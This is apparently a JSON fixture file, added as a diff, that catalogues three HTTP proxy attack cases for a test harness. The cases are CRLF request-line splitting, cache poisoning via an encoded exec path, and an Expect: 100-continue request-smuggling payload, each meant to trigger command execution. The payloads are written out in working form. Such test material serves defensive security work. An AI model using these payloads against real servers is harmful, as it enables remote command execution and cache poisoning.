@@ -1,0 +1,62 @@
+{
+ "dialect": "flat",
+ "build": "e1a28e35",
+ "prefix": "/api",
+ "cells": [
+  {
+   "family": "request_line_split",
+   "build": "e1a28e35",
+   "dialect": "flat",
+   "source": "r10M",
+   "poc": "ev_r10_M_drive.py",
+   "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+    }
+   ]
+  },
+  {
+   "family": "cache_exec_poison",
+   "build": "e1a28e35",
+   "dialect": "flat",
+   "source": "r10M",
+   "poc": "ev_r10_M_drive.py",
+   "shape": "seed %2f-split exec, then a victim with a different Accept-Encoding hits the entry",
+   "expect": "cache_victim",
+   "steps": [
+    {
+     "name": "seed",
+     "path": "/api%2fexec%20?cmd=id",
+     "keep_alive": true
+    },
+    {
+     "name": "victim",
+     "path": "/api%2fexec%20?cmd=id",
+     "headers": [
+      "Accept-Encoding: gzip"
+     ]
+    }
+   ],
+   "victim_same_key": false
+  },
+  {
+   "family": "1xx_nesting",
+   "build": "e1a28e35",
+   "dialect": "flat",
+   "source": "r11R",
+   "poc": "ev_r11_R_exp100.py",
+   "shape": "Expect + CL:0 POST: the interim 100 aborts the exchange, the body replays and executes",
+   "expect": "exec",
+   "peer": "onexx",
+   "steps": [
+    {
+     "name": "attack",
+     "raw": "POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nExpect: 100-continue\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
+    }
+   ]
+  }
+ ]
+}
